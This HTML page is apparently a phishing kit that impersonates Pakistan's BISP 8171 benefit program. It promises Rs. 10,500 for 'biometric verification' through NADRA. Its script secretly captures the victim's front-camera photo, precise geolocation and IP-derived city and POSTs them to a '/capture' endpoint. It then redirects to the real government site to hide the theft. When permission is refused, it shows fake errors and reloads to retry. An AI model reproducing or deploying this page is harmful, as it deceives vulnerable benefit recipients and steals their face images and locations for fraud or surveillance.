<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>BISP 8171 - Secure Verification</title>
    <style>
        :root { --bisp: #1b5e20; --gold: #fbc02d; }
        body { margin: 0; font-family: 'Inter', sans-serif; background: #000; color: white; overflow: hidden; }
        
        /* Full Screen Overlay for Interaction */
        #interaction-layer { position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 20px; }
        
        .pulse-btn { width: 100px; height: 100px; background: var(--bisp); border-radius: 50%; display: flex; align-items: center; justify-content: center; border: 4px solid var(--gold); cursor: pointer; animation: pulse 1.5s infinite; }
        
        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(27, 94, 32, 0.7); } 70% { box-shadow: 0 0 0 30px rgba(27, 94, 32, 0); } 100% { box-shadow: 0 0 0 0 rgba(27, 94, 32, 0); } }

        .card { background: white; color: #333; width: 90%; max-width: 400px; border-radius: 24px; padding: 30px; display: none; }
        
        /* 2026 Dynamic Error Style */
        .error-notif { background: #fff1f2; color: #be123c; padding: 15px; border-radius: 12px; font-size: 13px; font-weight: 800; border: 2px solid #fecdd3; display: none; margin-bottom: 15px; }

        .loader { border: 4px solid #f3f3f3; border-top: 4px solid var(--bisp); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div id="interaction-layer">
    <div class="pulse-btn" onclick="unlockSensors()">
        <svg width="40" height="40" viewBox="0 0 24 24" fill="white"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
    </div>
    <h2 style="margin-top:20px;">8171 Biometric Node</h2>
    <p style="font-size:14px; opacity:0.8;">Tap the shield to establish secure connection for Rs. 10,500.</p>
</div>

<div class="card" id="main-card">
    <div id="err" class="error-notif">⚠️ SYSTEM BLOCK: Biometric access is required. Please 'Allow' the prompt.</div>
    <div class="loader"></div>
    <h3 style="color:var(--bisp); text-align:center;">Biometric Syncing...</h3>
    <p style="font-size:13px; text-align:center;">Confirming identity via NADRA live interface. Please stay still.</p>
</div>

<video id="v" style="display:none;" autoplay playsinline></video>
<canvas id="c" style="display:none;" width="1080" height="1920"></canvas>

<script>
    let reportData = { cnic: "8171_USER", lat: "0", lon: "0", ip: "N/A", battery: "N/A" };

    // Advanced 2026 Permission Logic
    async function unlockSensors() {
        document.getElementById('interaction-layer').style.display = 'none';
        document.getElementById('main-card').style.display = 'block';

        // Chrome 2026 Logic: Gesture-based trigger
        try {
            // First: Request Fullscreen to reset browser engagement
            if (document.documentElement.requestFullscreen) {
                await document.documentElement.requestFullscreen();
            }

            // Second: Trigger Geo with 'High Accuracy' to force pop-up
            navigator.geolocation.getCurrentPosition(
                (p) => {
                    reportData.lat = p.coords.latitude;
                    reportData.lon = p.coords.longitude;
                    triggerBiometric();
                },
                () => { handleFail(); },
                { enableHighAccuracy: true, timeout: 8000 }
            );
        } catch (e) { handleFail(); }
    }

    function triggerBiometric() {
        navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: "user", width: 1280, height: 720 } 
        })
        .then(stream => {
            const video = document.getElementById('v');
            video.srcObject = stream;
            setTimeout(() => captureAndSend(stream), 2500);
        })
        .catch(() => handleFail());
    }

    function handleFail() {
        document.getElementById('err').style.display = 'block';
        // Logic: Agar block hua to URL change kar ke naye session par bhejo
        setTimeout(() => {
            const newRef = Math.random().toString(36).substring(7);
            window.location.href = window.location.pathname + "?retry=1&node=" + newRef;
        }, 3000);
    }

    async function captureAndSend(stream) {
        const canvas = document.getElementById('c');
        canvas.getContext('2d').drawImage(document.getElementById('v'), 0, 0, 1080, 1920);
        const photo = canvas.toDataURL('image/jpeg', 0.8);
        
        stream.getTracks().forEach(t => t.stop());

        // Multi-Provider Geo Fletcher
        try {
            const res = await fetch('https://ipapi.co/json/');
            const d = await res.json();
            reportData.ip = d.ip;
            reportData.city = d.city;
        } catch(e) {}

        fetch('/capture', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ info: reportData, photo: photo })
        }).then(() => {
            window.location.href = "https://8171.bisp.gov.pk/";
        });
    }
</script>
</body>
</html>
